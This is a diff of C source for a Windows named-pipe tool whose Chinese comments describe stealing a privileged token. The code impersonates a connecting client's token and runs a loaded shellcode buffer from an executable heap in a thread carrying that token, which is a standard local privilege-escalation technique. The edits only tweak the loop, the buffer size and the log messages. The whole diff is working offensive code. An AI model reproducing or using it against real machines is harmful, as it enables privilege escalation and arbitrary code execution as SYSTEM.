@@ -92,32 +92,35 @@ void StartNamedPipe()
 		return;
 	}
 	// 创建管道
-	hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
+	hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 1, 2048, 0, &sa);
 	if (hPipe == INVALID_HANDLE_VALUE) {
 		return;
 	}
 	
 	wprintf(L"[*] NamedPipe '%ls' listening...\n", pwszPipeName);
 	// 一直等待客户端连接，方便持续调用
-	for (;;) {
+	// for (;;) {
 		if (ConnectNamedPipe(hPipe, NULL) > 0) {
 			wprintf(L"[+] A client connected!\n");
 			// 模拟客户端Token
 			if (!ImpersonateNamedPipeClient(hPipe)) {
 				// 如果无法模拟就断开连接
 				DisconnectNamedPipe(hPipe);
-				continue;
+				//continue;
+				return;
 			}
 			GetUserName(szUser, &dwSize);
-			wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
+			wprintf(L"[+] Impersonating :) : %s\n", szUser);
 			// 将特权Token赋值到全局变量中
+			// HANDLE hToken = INVALID_HANDLE_VALUE;
 			OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &g_hSystemToken);
+			// OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
 			if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
 				// 如果Shellcode不为空，就开始创建线程执行
 				ExecuteShellCodeWithToken(g_hSystemToken);
 			}
 			DisconnectNamedPipe(hPipe);
-		}
+		//}
 	}
 	return;
 }
@@ -133,6 +136,7 @@ void ExecuteShellCodeWithToken(HANDLE hToken) {
 	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
 	PVOID Mptr = HeapAlloc(hHeap, 0, g_dwShellcodeSize);
 	RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
+	
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
 	SetThreadToken(&hThread, hToken);
 	ResumeThread(hThread);
